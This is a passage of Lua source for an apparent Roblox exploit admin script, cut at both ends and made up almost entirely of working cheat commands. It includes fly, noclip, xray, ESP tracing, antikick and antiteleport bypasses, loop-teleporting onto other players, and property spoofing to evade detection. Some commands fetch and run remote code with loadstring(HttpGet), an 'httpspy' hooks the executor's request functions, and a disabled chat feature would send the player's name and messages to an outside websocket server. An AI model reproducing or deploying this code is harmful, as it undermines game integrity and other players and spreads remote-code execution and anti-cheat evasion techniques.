		return format("now tracing %s", #Target == 1 and Target[1].Name or #Target .. " players");
	end)
	AddCommand("untrace", {"unlocate"}, "untraces a player", {"1"}, function(Caller, Args)
		if (not EspLib) then
			EspLib = loadstring(game.HttpGet(game, "https://raw.githubusercontent.com/fatesc/fates-esp/main/esp-lib/esplibmain.lua"))();
		end
		local Target = GetPlayer(Args[1]);
		local Remove = EspLib.Remove
		for i, v in next, Target do
			Remove(v);
		end
		return format("now stopped tracing %s", #Target == 1 and Target[1].Name or #Target .. " players");
	end)


	AddCommand("crosshair", {}, "enables a crosshair", {function()
		return Drawing ~= nil
	end}, function(Caller, Args, CEnv)
		if (CEnv[1] and CEnv[2] and CEnv[1].Transparency ~= 0) then
			CEnv[1].Remove(CEnv[1]);
			CEnv[2].Remove(CEnv[2]);
			CEnv[1] = nil
			CEnv[2] = nil
			return "crosshair disabled"
		end
		local Viewport = Camera.ViewportSize
		local Y = Drawing.new("Line");
		local X = Drawing.new("Line");
		Y.Thickness = 1
		X.Thickness = 1
		Y.Transparency = 1
		X.Transparency = 1
		Y.Visible = true
		X.Visible = true
		Y.To = Vector2.new(Viewport.X / 2, Viewport.Y / 2 - 10);
		X.To = Vector2.new(Viewport.X / 2 - 10, Viewport.Y / 2);
		Y.From = Vector2.new(Viewport.X / 2, Viewport.Y / 2 + 10);
		X.From = Vector2.new(Viewport.X / 2 + 10, Viewport.Y / 2);
		CEnv[1] = Y
		CEnv[2] = X
		return "crosshair enabled"
	end)

	AddCommand("walkto", {}, "walks to a player", {"1", 3}, function(Caller, Args)
		local Target = GetPlayer(Args[1])[1];
		local Humanoid = GetHumanoid();
		Humanoid.MoveTo(Humanoid, GetRoot(Target).Position);
		return "walking to " .. Target.Name
	end)

	AddCommand("follow", {}, "follows a player", {"1", 3}, function(Caller, Args, CEnv)
		local Target = GetPlayer(Args[1])[1]
		CEnv[Target.Name] = true
		CThread(function()
			repeat
				local Humanoid = GetHumanoid();
				Humanoid.MoveTo(Humanoid, GetRoot(Target).Position);
				wait(.2);
			until not LoadCommand("follow").CmdEnv[Target.Name]
		end)()
		return "now following " .. Target.Name
	end)

	AddCommand("unfollow", {}, "unfollows a player", {}, function()
		local Following = LoadCommand("follow").CmdEnv
		if (not next(Following)) then
			return "you are not following anyone"
		end
		LoadCommand("follow").CmdEnv = {}
		return "stopped following"
	end)

	AddCommand("age", {}, "ages a player", {"1"}, function(Caller, Args)
		local Target = GetPlayer(Args[1]);
		for i, v in next, Target do
			local AccountAge = v.AccountAge
			local t = os.date("*t", os.time());
			t.day = t.day - tonumber(AccountAge);
			local CreatedAt = os.date("%d/%m/%y", os.time(t));
			Utils.Notify(Caller, "Command", format("%s's age is %s (%s)", v.Name, AccountAge, CreatedAt));
		end
	end)

	AddCommand("nosales", {}, "no purchase prompt notifications will be shown", {}, function()
		Services.CoreGui.PurchasePrompt.Enabled = false
		return "You'll no longer recive sale prompts"
	end)

	AddCommand("volume", {"vol"}, "changes your game volume", {}, function(Caller, Args)
		local Volume = tonumber(Args[1]);
		if (not Volume or Volume > 10 or Volume < 0) then
			return "volume must be a number between 0-10";
		end
		local UserSettings = UserSettings()
		UserSettings.GetService(UserSettings, "UserGameSettings").MasterVolume = Volume / 10
		return "volume set to " .. Volume
	end)

	AddCommand("antikick", {}, "client sided bypasses to kicks", {}, function()
		Hooks.AntiKick = not Hooks.AntiKick
		return "client sided antikick " .. (Hooks.AntiKick and "enabled" or "disabled")
	end)

	AddCommand("antiteleport", {}, "client sided bypasses to teleports", {}, function()
		AntiTeleport = not AntiTeleport
		return "client sided antiteleport " .. (AntiTeleport and "enabled" or "disabled")
	end)

	AddCommand("autorejoin", {}, "auto rejoins the game when you get kicked", {}, function(Caller, Args, CEnv)
		local GuiService = Services.GuiService
		CThread(function()
			CWait(GuiService.ErrorMessageChanged);
			CWait(GuiService.ErrorMessageChanged);
			if (GuiService.GetErrorCode(GuiService) == Enum.ConnectionError.DisconnectLuaKick) then
				if (#GetPlayers(Players) == 1) then
					Services.TeleportService.Teleport(Services.TeleportService, game.PlaceId);
				else
					Services.TeleportService.TeleportToPlaceInstance(Services.TeleportService, game.PlaceId, game.JobId);
				end
			end
		end)()
		return "auto rejoin enabled (rejoins when you get kicked from the game)"
	end)

	AddCommand("respawn", {}, "respawns your character", {3}, function()
		local OldPos = GetRoot().CFrame
		local Char = GetCharacter();
		Char.BreakJoints(Char);
		CWait(LocalPlayer.CharacterAdded);
		WaitForChild(LocalPlayer.Character, "HumanoidRootPart").CFrame = OldPos
		return "respawned"
	end)

	AddCommand("reset", {}, "resets your character", {3}, function()
		local Char = GetCharacter();
		Char.BreakJoints(Char);
	end)

	AddCommand("refresh", {"re"}, "refreshes your character", {3}, function(Caller)
		ReplaceCharacter();
		wait(Players.RespawnTime - 0.03);
		local OldPos = GetRoot().CFrame
		ReplaceHumanoid()
		CWait(LocalPlayer.CharacterAdded)
		WaitForChild(LocalPlayer.Character, "HumanoidRootPart").CFrame = OldPos
		return "character refreshed"
	end)

	AddCommand("addalias", {}, "adds an alias to a command", {}, function(Caller, Args)
		local Command = Args[1]
		local Alias = Args[2]
		if (CommandsTable[Command]) then
			local Add = CommandsTable[Command]
			Add.Name = Alias
			CommandsTable[Alias] = Add
			local CurrentAliases = GetConfig().Aliases or {}
			CurrentAliases[Command] = CurrentAliases[Command] or {}
			local AliasesForCommand = CurrentAliases[Command]
			AliasesForCommand[#AliasesForCommand + 1] = Alias
			SetConfig({Aliases=CurrentAliases});
			return format("%s is now an alias of %s", Alias, Command);
		else
			return Command .. " is not a valid command"
		end
	end)

	AddCommand("removealias", {}, "removes an alias from a command", {}, function(Caller, Args) -- todo: fix it removing actual commands when doing so
		local Command = Args[1]
		local Alias = Args[2]
		if (not CommandsTable[Command]) then
			return Command .. " is not a valid command"
		end
		if (not CommandsTable[Alias]) then
			return Alias .. " is not an alias"
		end

		if (CommandsTable[Alias].Name ~= Alias) then
			local Cmd = CommandsTable[Alias]
			CommandsTable[Alias] = nil
			return format("removed alias %s from %s", Alias, Cmd.Name);
		end
		return "you can't remove commands"
	end)

	AddCommand("chatlogs", {"clogs"}, "enables chatlogs", {}, function()
		local MessageClone = Clone(ChatLogs.Frame.List);

		Utils.ClearAllObjects(ChatLogs.Frame.List)
		ChatLogs.Visible = true

		local Tween = Utils.TweenAllTransToObject(ChatLogs, .25, ChatLogsTransparencyClone)

		Destroy(ChatLogs.Frame.List)
		MessageClone.Parent = ChatLogs.Frame

		for i, v in next, GetChildren(ChatLogs.Frame.List) do
			if (not IsA(v, "UIListLayout")) then
				Utils.Tween(v, "Sine", "Out", .25, {
					TextTransparency = 0
				})
			end
		end

		local ChatLogsListLayout = ChatLogs.Frame.List.UIListLayout

		CConnect(GetPropertyChangedSignal(ChatLogsListLayout, "AbsoluteContentSize"), function()
			local CanvasPosition = ChatLogs.Frame.List.CanvasPosition
			local CanvasSize = ChatLogs.Frame.List.CanvasSize
			local AbsoluteSize = ChatLogs.Frame.List.AbsoluteSize

			if (CanvasSize.Y.Offset - AbsoluteSize.Y - CanvasPosition.Y < 20) then
				wait() -- chatlogs updates absolutecontentsize before sizing frame
				ChatLogs.Frame.List.CanvasPosition = Vector2.new(0, CanvasSize.Y.Offset + 1000) --ChatLogsListLayout.AbsoluteContentSize.Y + 100)
			end
		end)

		Utils.Tween(ChatLogs.Frame.List, "Sine", "Out", .25, {
			ScrollBarImageTransparency = 0
		})
	end)

	AddCommand("globalchatlogs", {"globalclogs"}, "enables globalchatlogs", {}, function()
		do return "Command Disabled" end

		local MessageClone = Clone(GlobalChatLogs.Frame.List);

		Utils.ClearAllObjects(GlobalChatLogs.Frame.List);
		GlobalChatLogs.Visible = true

		local Tween = Utils.TweenAllTransToObject(GlobalChatLogs, .25, GlobalChatLogsTransparencyClone);


		MessageClone.Parent = ChatLogs.Frame

		for i, v in next, GetChildren(GlobalChatLogs.Frame.List) do
			if (not IsA(v, "UIListLayout")) then
				Utils.Tween(v, "Sine", "Out", .25, {
					TextTransparency = 0
				})
			end
		end

		local GlobalChatLogsListLayout = GlobalChatLogs.Frame.List.UIListLayout

		CConnect(GetPropertyChangedSignal(GlobalChatLogsListLayout, "AbsoluteContentSize"), function()
			local CanvasPosition = GlobalChatLogs.Frame.List.CanvasPosition
			local CanvasSize = GlobalChatLogs.Frame.List.CanvasSize
			local AbsoluteSize = GlobalChatLogs.Frame.List.AbsoluteSize

			if (CanvasSize.Y.Offset - AbsoluteSize.Y - CanvasPosition.Y < 20) then
				wait() -- chatlogs updates absolutecontentsize before sizing frame
				GlobalChatLogs.Frame.List.CanvasPosition = Vector2.new(0, CanvasSize.Y.Offset + 1000) --ChatLogsListLayout.AbsoluteContentSize.Y + 100)
			end
		end)

		Utils.Tween(GlobalChatLogs.Frame.List, "Sine", "Out", .25, {
			ScrollBarImageTransparency = 0
		});

		_L.GlobalChatLogsEnabled = true
		if (not Socket) then
			Socket = (syn and syn.websocket or WebSocket).connect("ws://fate0.xyz:8080/scripts/fates-admin/chat?username=" .. LocalPlayer.Name);

			local MakeMessage = function(Message, Color)
				Clone.Text = Message
				if (Color) then
					Clone.TextColor3 = Color
				end
				Clone.Visible = true
				Clone.TextTransparency = 1
				Clone.Parent = GlobalChatLogs.Frame.List
				Utils.Tween(Clone, "Sine", "Out", .25, {
					TextTransparency = 0
				});
				GlobalChatLogs.Frame.List.CanvasSize = UDim2.fromOffset(0, GlobalChatLogs.Frame.List.UIListLayout.AbsoluteContentSize.Y);

			end

			CConnect(Socket.OnMessage, function(msg)
				if (_L.GlobalChatLogsEnabled) then
					local OP, DATA = unpack(JSONDecode(Services.HttpService, msg));
					local Clone = Clone(GlobalChatLogMessage);
					local CurrentTime = tostring(os.date("%X"));
					if (OP == "received_message") then
						MakeMessage(format("%s - [%s]: %s", CurrentTime, DATA.username, msg.message));
					elseif (OP == "admin_message") then
						MakeMessage(format("%s - [%s]: %s", CurrentTime, DATA.username, msg.message), Color3.fromRGB(DATA.Color.R, DATA.Color.G, DATA.Color.B));
					elseif (OP == "verification_needed") then
						MakeMessage(format("[%s] - [C-LOG]: You need to visit http://whatever/chat/verify", CurrentTime), Color3.fromRGB(255, 0, 0));
					elseif (OP == "error") then
						MakeMessage(format("[%s] - [C-LOG]: %s", CurrentTime, DATA.message));
					end

				end
			end)
			local MessageSender = require(LocalPlayer.PlayerScripts.ChatScript.ChatMain.MessageSender);
			local OldSendMessage = MessageSender.SendMessage
			MessageSender.SendMessage = function(self, Message, ...)
				if (_L.GlobalChatLogsEnabled) then
					local CurrentTime = tostring(os.date("%X"));
					if (#Message > 30) then
						MakeMessage(format("[%s] - [C-LOG]: Message is too long dsadsadasdasd.aas...", CurrentTime));
					end
					Socket.Send(Socket, JSONEncode({
						username = LocalPlayer.Name,
						message = Message,
					}));
				else
					return OldSendMessage(self, Message, ...);
				end
			end

			MessageSender.SendMessage = OldSendMessage

			while (Socket and wait(30)) do
				Send(Socket, "ping");
			end
		end
	end)

	AddCommand("httplogs", {"httpspy"}, "enables httpspy", {}, function()
		local MessageClone = Clone(HttpLogs.Frame.List);

		Utils.ClearAllObjects(HttpLogs.Frame.List)
		HttpLogs.Visible = true

		local Tween = Utils.TweenAllTransToObject(HttpLogs, .25, HttpLogsTransparencyClone)

		Destroy(HttpLogs.Frame.List)
		MessageClone.Parent = HttpLogs.Frame

		for i, v in next, GetChildren(HttpLogs.Frame.List) do
			if (not IsA(v, "UIListLayout")) then
				Utils.Tween(v, "Sine", "Out", .25, {
					TextTransparency = 0
				})
			end
		end

		local HttpLogsListLayout = HttpLogs.Frame.List.UIListLayout

		CConnect( GetPropertyChangedSignal(HttpLogsListLayout, "AbsoluteContentSize"), function()
			local CanvasPosition = HttpLogs.Frame.List.CanvasPosition
			local CanvasSize = HttpLogs.Frame.List.CanvasSize
			local AbsoluteSize = HttpLogs.Frame.List.AbsoluteSize

			if (CanvasSize.Y.Offset - AbsoluteSize.Y - CanvasPosition.Y < 20) then
				wait() -- chatlogs updates absolutecontentsize before sizing frame
				HttpLogs.Frame.List.CanvasPosition = Vector2.new(0, CanvasSize.Y.Offset + 1000) --ChatLogsListLayout.AbsoluteContentSize.Y + 100)
			end
		end)

		Utils.Tween(HttpLogs.Frame.List, "Sine", "Out", .25, {
			ScrollBarImageTransparency = 0
		})

		local AddLog = function(reqType, url, Req)
			if (getgenv().F_A and UI) then
				local Clone = Clone(ChatLogMessage);
				Clone.Text = format("%s\nUrl: %s%s\n", Utils.TextFont(reqType .. " Detected (time: " .. tostring(os.date("%X")) ..")", {255, 165, 0}), url, Req and ", RequestPayLoad: " .. Utils.TextFont(Req, {255, 255, 0}) or "");
				Clone.RichText = true
				Clone.Visible = true
				Clone.TextTransparency = 1
				Clone.Parent = HttpLogs.Frame.List
				Utils.Tween(Clone, "Sine", "Out", .25, {
					TextTransparency = 0
				});
				HttpLogs.Frame.List.CanvasSize = UDim2.fromOffset(0, HttpLogs.Frame.List.UIListLayout.AbsoluteContentSize.Y);
			end
		end

		local Request;
		Request = hookfunction(syn and syn.request or request, newcclosure(function(reqtbl)
			AddLog(syn and "syn.request" or "request", reqtbl.Url, JSONEncode(Services.HttpService, reqtbl));
			return Request(reqtbl);
		end));
		local Httpget;
		Httpget = hookfunction(game.HttpGet, newcclosure(function(self, url)
			AddLog("HttpGet", url);
			return Httpget(self, url);
		end));
		if (game.HttpGet ~= game.HttpGetAsync) then
			local HttpgetAsync;
			HttpgetAsync = hookfunction(game.HttpGetAsync, newcclosure(function(self, url)
				AddLog("HttpGetAsync", url);
				return HttpgetAsync(self, url);
			end));
		end
		local Httppost;
		Httppost = hookfunction(game.HttpPost, newcclosure(function(self, url)
			AddLog("HttpPost", url);
			return Httppost(self, url);
		end));
		if (game.HttpPost ~= game.HttpPostAsync) then
			local HttppostAsync;
			HttppostAsync = hookfunction(game.HttpPostAsync, newcclosure(function(self, url)
				AddLog("HttpPostAsync", url);
				return HttppostAsync(self, url);
			end));
		end

		local Clone = Clone(ChatLogMessage);
		Clone.Text = "httpspy loaded"
		Clone.RichText = true
		Clone.Visible = true
		Clone.TextTransparency = 1
		Clone.Parent = HttpLogs.Frame.List
		Utils.Tween(Clone, "Sine", "Out", .25, {
			TextTransparency = 0
		});
		HttpLogs.Frame.List.CanvasSize = UDim2.fromOffset(0, HttpLogs.Frame.List.UIListLayout.AbsoluteContentSize.Y);
	end)

	AddCommand("btools", {}, "gives you btools", {3}, function(Caller, Args)
		local BP = LocalPlayer.Backpack
		for i = 1, 4 do
			local Bin = InstanceNew("HopperBin");
			Bin.BinType = i
			-- ProtectInstance(Bin);
			Bin.Parent = BP
		end
		return "client sided btools loaded"
	end)

	AddCommand("spin", {}, "spins your character (optional: speed)", {}, function(Caller, Args, CEnv)
		local Speed = Args[1] or 5
		if (not CEnv[1]) then
			local Spin = InstanceNew("BodyAngularVelocity");
			ProtectInstance(Spin);
			Spin.Parent = GetRoot();
			Spin.MaxTorque = Vector3New(0, math.huge, 0);
			Spin.AngularVelocity = Vector3New(0, Speed, 0);
			CEnv[#CEnv + 1] = Spin
		else
			CEnv[1].AngularVelocity = Vector3New(0, Speed, 0);
		end
		return "started spinning"
	end)

	AddCommand("unspin", {}, "unspins your character", {}, function(Caller, Args)
		local Spinning = LoadCommand("spin").CmdEnv
		for i, v in next, Spinning do
			Destroy(v);
		end
		LoadCommand("spin").CmdEnv = {}
		return "stopped spinning"
	end)

	AddCommand("goto", {"to"}, "teleports yourself to the other character", {3, "1"}, function(Caller, Args)
		local Target = GetPlayer(Args[1]);
		local Delay = tonumber(Args[2]);
		for i, v in next, Target do
			if (Delay) then
				wait(Delay);
			end
			if (Caller ~= LocalPlayer) then
				ExecuteCommand("bring", {Caller.Name, v.Name}, LocalPlayer)
			else
				GetRoot().CFrame = GetRoot(v).CFrame * CFrameNew(-5, 0, 0);
			end
		end
	end)

	AddCommand("loopgoto", {"loopto"}, "loop teleports yourself to the other character", {3, "1"}, function(Caller, Args, CEnv)
		local Target = GetPlayer(Args[1])[1]
		local Connection = CConnect(Heartbeat, function()
			GetRoot().CFrame = GetRoot(Target).CFrame * CFrameNew(0, 0, 2);
		end)

		CEnv[Target.Name] = Connection
		AddPlayerConnection(LocalPlayer, Connection);
		AddConnection(Connection);
		return "now looping to " .. Target.name
	end)

	AddCommand("unloopgoto", {"unloopto"}, "removes loop teleportation to the other character", {}, function(Caller)
		local Looping = LoadCommand("loopgoto").CmdEnv;
		if (not next(Looping)) then
			return "you aren't loop teleporting to anyone"
		end
		DisableAllCmdConnections("loopgoto");
		return "loopgoto disabled"
	end)

	AddCommand("tweento", {"tweengoto"}, "tweens yourself to the other person", {3, "1"}, function(Caller, Args)
		local Target = GetPlayer(Args[1]);
		local TweenService = Services.TweenService
		local Create = TweenService.Create
		for i, v in next, Target do
			local Tween = Create(TweenService, GetRoot(), TweenInfo.new(2), {CFrame = GetRoot(v).CFrame})
			Tween.Play(Tween);
		end
	end)

	AddCommand("truesight", {"ts"}, "shows all the transparent stuff", {}, function(Caller, Args, CEnv)
		local amount = 0
		local time = tick();
		for i, v in next, GetDescendants(Services.Workspace) do
			if (IsA(v, "Part") and v.Transparency >= 0.3) then
				CEnv[v] = v.Transparency
				SpoofProperty(v, "Transparency");
				v.Transparency = 0
				amount = amount + 1
			end
		end

		return format("%d items shown in %.3f (s)", amount, (tick()) - time);
	end)

	AddCommand("notruesight", {"nots"}, "removes truesight", {}, function(Caller, Args)
		local showing = LoadCommand("truesight").CmdEnv
		local time = tick();
		for i, v in next, showing do
			i.Transparency = v
		end
		return format("%d items hidden in %.3f (s)", #showing, (tick()) - time);
	end)

	AddCommand("xray", {}, "see through wallks", {}, function(Caller, Args, CEnv)
		for i, v in next, GetDescendants(Services.Workspace) do
			if IsA(v, "Part") and v.Transparency <= 0.3 then
				CEnv[v] = v.Transparency
				SpoofProperty(v, "Transparency");
				v.Transparency = 0.3
			end
		end
		return "xray is now on"
	end)

	AddCommand("noxray", {"unxray"}, "stops xray", {}, function(Caller, Args)
		local showing = LoadCommand("xray").CmdEnv
		local time = tick();
		for i, v in next, showing do
			i.Transparency = v
		end
		return "xray is now off"
	end)

	AddCommand("nolights", {}, "removes all lights", {}, function(Caller, Args, CEnv)
		SpoofProperty(Lighting, "GlobalShadows");
		for i, v in next, GetDescendants(game) do
			if (IsA(v, "PointLight") or IsA(v, "SurfaceLight") or IsA(v, "SpotLight")) then
				CEnv[v] = v.Parent
				v.Parent = nil
			end
		end
		Lighting.GlobalShadows = true
		return "removed all lights"
	end)

	AddCommand("revertnolights", {"lights"}, "reverts nolights", {}, function()
		local Lights = LoadCommand("nolights").CmdEnv
		for i, v in next, Lights do
			i.Parent = v
		end
		return "fullbright disabled"
	end)

	AddCommand("fullbright", {"fb"}, "turns on fullbright", {}, function(Caller, Args, CEnv)
		local Lighting = Services.Lighting
		for i, v in next, GetDescendants(game) do
			if (IsA(v, "PointLight") or IsA(v, "SurfaceLight") or IsA(v, "SpotLight")) then
				CEnv[v] = v.Range
				SpoofInstance(v);
				v.Enabled = true
				v.Shadows = false
				v.Range = math.huge
			end
		end
		SpoofProperty(Lighting, "GlobalShadows");
		Lighting.GlobalShadows = false
		return "fullbright enabled"
	end)

	AddCommand("nofullbright", {"revertlights", "unfullbright", "nofb"}, "reverts fullbright", {}, function()
		local Lighting = Services.Lighting
		local Lights = LoadCommand("fullbright").CmdEnv
		for i, v in next, Lights do
			i.Range = v
		end
		Lighting.GlobalShadows = true
		return "fullbright disabled"
	end)

	AddCommand("swim", {}, "allows you to use the swim state", {3}, function(Caller, Args, CEnv)
		local Humanoid = GetHumanoid();
		SpoofInstance(Humanoid);
		for i, v in next, Enum.HumanoidStateType.GetEnumItems(Enum.HumanoidStateType) do
			SetStateEnabled(Humanoid, v, false);
		end
		CEnv[1] = GetState(Humanoid);
		ChangeState(Humanoid, Enum.HumanoidStateType.Swimming);
		SpoofProperty(Services.Workspace, "Gravity");
		Services.Workspace.Gravity = 0
		CThread(function()
			CWait(Humanoid.Died);
			Services.Workspace.Gravity = 198
		end)()
		return "swimming enabled"
	end)

	AddCommand("unswim", {"noswim"}, "removes swim", {}, function(Caller, Args)
		local Humanoid = GetHumanoid();
		for i, v in next, Enum.HumanoidStateType.GetEnumItems(Enum.HumanoidStateType) do
			SetStateEnabled(Humanoid, v, true);
		end
		ChangeState(Humanoid, LoadCommand("swim").CmdEnv[1]);
		Services.Workspace.Gravity = 198
		return "swimming disabled"
	end)

	AddCommand("disableanims", {"noanims"}, "disables character animations", {3}, function(Caller, Args)
		local Animate = FindFirstChild(GetCharacter(), "Animate");
		SpoofProperty(Animate, "Disabled");
		Animate.Disabled = true
		return "animations disabled"
	end)

	AddCommand("enableanims", {"anims"}, "enables character animations", {3}, function(Caller, Args)
		FindFirstChild(GetCharacter(), "Animate").Disabled = false
		return "animations enabled"
	end)

	AddCommand("fly", {}, "fly your character", {3}, function(Caller, Args, CEnv)
		CEnv[1] = tonumber(Args[1]) or GetConfig().FlySpeed or 2
		local Speed = CEnv[1]
		local Root = GetRoot();
		local BodyGyro = InstanceNew("BodyGyro");
		local BodyVelocity = InstanceNew("BodyVelocity");
		local IdleAnim1 = "507766388"

		local Character = GetCharacter();
		local Animate = FindFirstChild(Character, "Animate");

		if (Animate) then
			pcall(function()
				CEnv.AnimsChanged = {}
				local Run = Animate.run.RunAnim
				CEnv.AnimsChanged[Run] = Run.AnimationId
				Run.AnimationId = IdleAnim1
				local Walk = Animate.walk.WalkAnim
				CEnv.AnimsChanged[Walk] = Walk.AnimationId
				Walk.AnimationId = IdleAnim1
				local Fall = Animate.fall.FallAnim
				CEnv.AnimsChanged[Fall] = Fall.AnimationId
				Fall.AnimationId = IdleAnim1
				local Jump = Animate.jump.JumpAnim
				CEnv.AnimsChanged[Jump] = Jump.AnimationId
				Jump.AnimationId = IdleAnim1
			end)
		end

		SpoofInstance(Root, isR6() and Character.Torso or Character.UpperTorso);
		ProtectInstance(BodyGyro);
		ProtectInstance(BodyVelocity);
		BodyGyro.Parent = Root
		BodyVelocity.Parent = Root
		BodyGyro.P = 9e9
		BodyGyro.MaxTorque = Vector3New(1, 1, 1) * 9e9
		BodyGyro.CFrame = Root.CFrame
		BodyVelocity.MaxForce = Vector3New(1, 1, 1) * 9e9
		BodyVelocity.Velocity = Vector3New(0, 0.1, 0);
		local Humanoid = GetHumanoid();
		ChangeState(Humanoid, 8);
		AddConnection(CConnect(Humanoid.StateChanged, function()
			ChangeState(Humanoid, 8);
			Humanoid.PlatformStand = false
		end), CEnv)

		local Table1 = { ['W'] = 0; ['A'] = 0; ['S'] = 0; ['D'] = 0 }

		CThread(function()
			while (next(LoadCommand("fly").CmdEnv) and wait()) do
				Speed = LoadCommand("fly").CmdEnv[1]

				Table1["W"] = Keys["W"] and Speed or 0
				Table1["A"] = Keys["A"] and -Speed or 0
				Table1["S"] = Keys["S"] and -Speed or 0
				Table1["D"] = Keys["D"] and Speed or 0
				if ((Table1["W"] + Table1["S"]) ~= 0 or (Table1["A"] + Table1["D"]) ~= 0) then
					BodyVelocity.Velocity = ((Camera.CoordinateFrame.lookVector * (Table1["W"] + Table1["S"])) + ((Camera.CoordinateFrame * CFrameNew(Table1["A"] + Table1["D"], (Table1["W"] + Table1["S"]) * 0.2, 0).p) - Camera.CoordinateFrame.p)) * 50
				else
					BodyVelocity.Velocity = Vector3New(0, 0.1, 0);
				end
				BodyGyro.CFrame = Camera.CoordinateFrame
			end
		end)();
	end)

	AddCommand("fly2", {}, "fly your character", {3}, function(Caller, Args, CEnv)
		LoadCommand("fly").CmdEnv[1] = tonumber(Args[1]) or GetConfig().FlySpeed or 3
		local Speed = LoadCommand("fly").CmdEnv[1]
		for i, v in next, GetChildren(GetRoot()) do
			if (IsA(v, "BodyPosition") or IsA(v, "BodyGyro")) then
				Destroy(v);
			end
		end
		local BodyPos = InstanceNew("BodyPosition");
		local BodyGyro = InstanceNew("BodyGyro");
		ProtectInstance(BodyPos);
		ProtectInstance(BodyGyro);
		SpoofProperty(GetHumanoid(), "FloorMaterial");
		SpoofProperty(GetHumanoid(), "PlatformStand");
		BodyPos.Parent = GetRoot();
		BodyGyro.Parent = GetRoot();
		BodyGyro.maxTorque = Vector3New(1, 1, 1) * 9e9
		BodyGyro.CFrame = GetRoot().CFrame
		BodyPos.maxForce = Vector3New(1, 1, 1) * math.huge
		GetHumanoid().PlatformStand = true
		CThread(function()
			BodyPos.Position = GetRoot().Position
			while (next(LoadCommand("fly").CmdEnv) and wait()) do
				Speed = LoadCommand("fly").CmdEnv[1]
				local NewPos = (BodyGyro.CFrame - (BodyGyro.CFrame).Position) + BodyPos.Position
				local CoordinateFrame = Camera.CoordinateFrame
				if (Keys["W"]) then
					NewPos = NewPos + CoordinateFrame.lookVector * Speed

					BodyPos.Position = (GetRoot().CFrame * CFrameNew(0, 0, -Speed)).Position;
					BodyGyro.CFrame = CoordinateFrame * CFrame.Angles(-rad(Speed * 15), 0, 0);
				end
				if (Keys["A"]) then
					NewPos = NewPos * CFrameNew(-Speed, 0, 0);
				end
				if (Keys["S"]) then
					NewPos = NewPos - CoordinateFrame.lookVector * Speed

					BodyPos.Position = (GetRoot().CFrame * CFrameNew(0, 0, Speed)).Position;
					BodyGyro.CFrame = CoordinateFrame * CFrame.Angles(-rad(Speed * 15), 0, 0);
				end
				if (Keys["D"]) then
					NewPos = NewPos * CFrameNew(Speed, 0, 0);
				end
				BodyPos.Position = NewPos.Position
				BodyGyro.CFrame = CoordinateFrame
			end
			GetHumanoid().PlatformStand = false
		end)();
	end)

	AddCommand("flyspeed", {"fs"}, "changes the fly speed", {3, "1"}, function(Caller, Args)
		local Speed = tonumber(Args[1]);
		LoadCommand("fly").CmdEnv[1] = Speed or LoadCommand("fly2").CmdEnv[1]
		if (Speed) then
			SetConfig({FlySpeed=Speed});
			return "your fly speed is now " .. Speed
		else
			return "flyspeed must be a number"
		end
	end)

	AddCommand("unfly", {}, "unflies your character", {3}, function()
		DisableAllCmdConnections("fly");
		local FlyCEnv = LoadCommand("fly").CmdEnv
		if (FlyCEnv.AnimsChanged) then
			for Anim, AnimId in next, FlyCEnv.AnimsChanged do
				Anim.AnimationId = AnimId
			end
		end
		table.clear(FlyCEnv);
		LoadCommand("fly2").CmdEnv = {}
		local Root = GetRoot();
		local Instances = { ["BodyPosition"] = true, ["BodyGyro"] = true, ["BodyVelocity"] = true }
		for i, v in next, GetChildren(Root) do
			if (Instances[v.ClassName]) then
				Destroy(v);
			end
		end
		UnSpoofInstance(Root);
		GetHumanoid().PlatformStand = false
	end)

	AddCommand("float", {}, "floats your character", {}, function(Caller, Args, CEnv)
		if (not CEnv[1]) then
			local Part = InstanceNew("Part");
			Part.CFrame = CFrameNew(0, -10000, 0);
			Part.Size = Vector3New(2, .2, 1.5);
			Part.Material = "Grass"
			Part.Anchored = true
			Part.Transparency = 1
			ProtectInstance(Part);
			Part.Parent = Services.Workspace
			CEnv[2] = Part
			local R6 = isR6();
			local Root = GetRoot();
			AddConnection(CConnect(RenderStepped, function()
				if (CEnv[1] and Root) then
					Part.CFrame = Root.CFrame * CFrameNew(0, -3.1, 0);
				else
					Part.CFrame = CFrameNew(0, -10000, 0);
					Root = GetRoot();
				end
				if (Keys["Q"]) then
					Root.CFrame = Root.CFrame * CFrameNew(0, -1.5, 0);
				elseif (Keys["E"]) then
					Root.CFrame = Root.CFrame * CFrameNew(0, 1.5, 0);
				end
			end), CEnv)
			return "now floating"
		end
	end)

	AddCommand("unfloat", {"nofloat"}, "stops float", {}, function(Caller, Args, CEnv)
		local Floating = LoadCommand("float").CmdEnv
		if (Floating[1]) then
			Disconnect(Floating[1]);
			Destroy(Floating[2]);
			LoadCommand("float").CmdEnv = {}
			return "stopped floating"
		end
		return "floating not on"
	end)

	AddCommand("fov", {}, "sets your fov", {}, function(Caller, Args)
		local Amount = tonumber(Args[1]) or 70
		SpoofProperty(Camera, "FieldOfView");
		Camera.FieldOfView = Amount
	end)

	AddCommand("noclip", {}, "noclips your character", {3}, function(Caller, Args, CEnv)
		local Char = GetCharacter()
		local Noclipping = AddConnection(CConnect(Stepped, function()
			for i, v in next, GetChildren(Char) do
				if (IsA(v, "BasePart") and v.CanCollide) then
					SpoofProperty(v, "CanCollide");
					v.CanCollide = false
				end
			end
		end), CEnv);
		local Torso = isR6() and Char.Torso or Char.UpperTorso
		local Noclipping2 = AddConnection(CConnect(Torso.Touched, function(Part)
			if (Part and Part.CanCollide and not FindFirstChildWhichIsA(Part.Parent, "Humanoid")) then
				local OldTransparency = Part.Transparency
				Part.CanCollide = false
				Part.Transparency = Part.Transparency <= 0.5 and 0.6 or Part.Transparency
				wait(2);
				Part.CanCollide = true
				Part.Transparency = OldTransparency
			end
		end), CEnv);
		Utils.Notify(Caller, "Command", "noclip enabled");
		CWait(GetHumanoid().Died);
		DisableAllCmdConnections("noclip");
		return "noclip disabled"
	end)

	AddCommand("clip", {"unnoclip"}, "disables noclip", {}, function(Caller, Args)
		if (not next(LoadCommand("noclip").CmdEnv)) then
			return "you aren't in noclip"
		else
			DisableAllCmdConnections("noclip");
			return "noclip disabled"
		end
	end)

	AddCommand("anim", {"animation"}, "plays an animation", {3, "1"}, function(Caller, Args)
		local Anims = {
			["idle"] = 180435571,
			["idle2"] = 180435792,
			["walk"] = 180426354,
			["run"] = 180426354,
			["jump"] = 125750702,
			["climb"] = 180436334,
			["toolnone"] = 182393478,
			["fall"] = 180436148,
			["sit"] = 178130996,
			["dance"] = 182435998,
			["dance2"] = 182491277,
			["dance3"] = 182491423
		}
		if (not Anims[Args[1]]) then
			return "there is no animation named " .. Args[1]
		end
		local Humanoid = GetHumanoid()
		local Animation = InstanceNew("Animation");
